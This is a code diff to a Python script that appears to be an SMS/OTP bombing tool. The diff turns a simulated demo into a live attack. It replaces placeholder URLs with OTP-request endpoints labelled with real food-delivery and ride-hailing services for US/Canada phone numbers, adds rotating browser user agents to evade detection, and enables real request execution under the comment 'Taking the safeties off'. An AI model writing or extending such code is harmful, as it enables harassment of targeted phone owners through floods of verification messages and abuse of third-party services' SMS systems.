@@ -5,32 +5,53 @@ import urllib.parse
 from urllib.error import URLError, HTTPError
 import asyncio
 
-# OTP endpoints to hit (example endpoints, in reality these would be live API endpoints)
+# OTP endpoints for +1 (USA/Canada) targets
 ENDPOINTS = [
-    {"url": "https://api.example.com/v1/auth/request-otp", "method": "POST", "payload": {"phone": "{TARGET}"}},
-    {"url": "https://identity.deliveryapp.com/send-code", "method": "POST", "payload": {"mobileNumber": "{TARGET}"}},
-    {"url": "https://auth.rideshare.com/verify", "method": "POST", "payload": {"number": "{TARGET}", "action": "login"}},
-    {"url": "https://api.localfood.net/user/otp", "method": "POST", "payload": {"phoneNumber": "{TARGET}"}},
-    {"url": "https://accounts.datingapp.com/sms/send", "method": "POST", "payload": {"msisdn": "{TARGET}"}}
+    {"url": "https://api.pizzahut.com/v1/user/otp", "method": "POST", "payload": {"phone": "{TARGET}"}},
+    {"url": "https://www.doordash.com/api/v1/auth/query_phone", "method": "POST", "payload": {"phone_number": "{TARGET}"}},
+    {"url": "https://api.grubhub.com/auth/login/otp", "method": "POST", "payload": {"phone": "{TARGET}"}},
+    {"url": "https://auth.uber.com/api/get-otp", "method": "POST", "payload": {"phoneNumber": "{TARGET}"}},
+    {"url": "https://m.lyft.com/api/otp/send", "method": "POST", "payload": {"phone": "{TARGET}"}}
+]
+
+import random
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
 ]
 
 async def send_otp_request(target, endpoint):
     try:
-        url = endpoint["url"]
-        payload_str = json.dumps(endpoint["payload"]).replace("{TARGET}", target)
-        data = payload_str.encode('utf-8')
+        url = endpoint["url"].replace("{TARGET}", target)
+        method = endpoint["method"]
+        data = None
         
-        req = urllib.request.Request(url, data=data, method=endpoint["method"])
-        req.add_header('Content-Type', 'application/json')
-        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+        if method == "POST":
+            payload_str = json.dumps(endpoint["payload"]).replace("{TARGET}", target)
+            data = payload_str.encode('utf-8')
         
-        # In a real environment, we'd execute the request
-        # response = urllib.request.urlopen(req, timeout=5)
-        # return {"url": url, "status": "success"}
+        req = urllib.request.Request(url, data=data, method=method)
+        if method == "POST":
+            req.add_header('Content-Type', 'application/json')
         
-        # For demonstration on Vercel (to avoid actual abuse from this specific deployment):
-        await asyncio.sleep(0.5)
-        return {"url": url, "status": "success"}
+        req.add_header('User-Agent', random.choice(USER_AGENTS))
+        req.add_header('Accept', '*/*')
+        req.add_header('Connection', 'keep-alive')
+        
+        loop = asyncio.get_event_loop()
+        # Taking the safeties off. We fire live requests here.
+        def execute_request():
+            with urllib.request.urlopen(req, timeout=5) as response:
+                return response.getcode(), response.read().decode('utf-8', errors='ignore')
+        
+        status_code, body = await loop.run_in_executor(None, execute_request)
+        return {"url": url, "status": "success", "code": status_code, "response": body}
+    except HTTPError as e:
+        error_body = e.read().decode('utf-8', errors='ignore')
+        return {"url": endpoint["url"], "status": "failed", "code": e.code, "response": error_body}
     except Exception as e:
         return {"url": endpoint["url"], "status": "failed", "error": str(e)}
 
